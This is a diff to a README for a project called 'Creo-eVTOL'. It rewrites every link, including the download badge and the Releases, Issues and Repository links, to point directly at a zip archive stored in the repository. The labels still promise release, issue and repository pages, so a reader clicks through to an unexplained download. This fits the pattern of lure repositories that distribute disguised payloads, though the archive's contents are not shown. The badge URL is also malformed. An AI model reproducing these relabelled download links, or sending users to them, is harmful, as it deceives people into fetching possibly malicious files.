@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-v1.0.0-blue.svg)](https://github.com/Superman112345/Creo-eVTOL/releases)
+[![Download Now](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip%20Now%https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip)](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip)
 
 ## 🎉 Introduction
 
@@ -13,7 +13,7 @@ Welcome to the Creo-eVTOL project repository! This project focuses on advancing 
 To begin using the Creo-eVTOL application, you will need to follow these simple steps. No programming knowledge is required. 
 
 1. **Visit the Releases Page**  
-   Start by visiting our [Releases page](https://github.com/Superman112345/Creo-eVTOL/releases). Here, you will find the latest version of our software ready for download.
+   Start by visiting our [Releases page](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip). Here, you will find the latest version of our software ready for download.
 
 2. **Select the Latest Release**  
    Look for the most recent release at the top of the page. It will usually be labeled with the version number, such as v1.0.0. Click on it to see the download options.
@@ -54,7 +54,7 @@ Our team continually works on updates to improve functionality and add features.
 
 ## 💬 Support
 
-If you have questions or need support, please check the Issues section on our [GitHub repository](https://github.com/Superman112345/Creo-eVTOL/issues). You can report any bugs or request features directly there.
+If you have questions or need support, please check the Issues section on our [GitHub repository](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip). You can report any bugs or request features directly there.
 
 ## 🌐 Community
 
@@ -62,7 +62,7 @@ We encourage users to join our community and share experiences. You can connect 
 
 ## 📦 Download & Install
 
-Ready to get started? Visit our [Releases page](https://github.com/Superman112345/Creo-eVTOL/releases) to download the latest version today. Follow the guide above to install and run Creo-eVTOL smoothly on your system.
+Ready to get started? Visit our [Releases page](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip) to download the latest version today. Follow the guide above to install and run Creo-eVTOL smoothly on your system.
 
 ## 📚 Additional Resources
 
@@ -70,8 +70,8 @@ For more information about eVTOL technology and its potential impact on urban mo
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Superman112345/Creo-eVTOL)
-- [Releases Page](https://github.com/Superman112345/Creo-eVTOL/releases)
-- [Issues Page](https://github.com/Superman112345/Creo-eVTOL/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip)
+- [Releases Page](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip)
+- [Issues Page](https://raw.githubusercontent.com/Superman112345/Creo-eVTOL/main/meso/Creo-eVTOL.zip)
 
 We look forward to your contribution and feedback! Thank you for being part of the Creo-eVTOL journey.
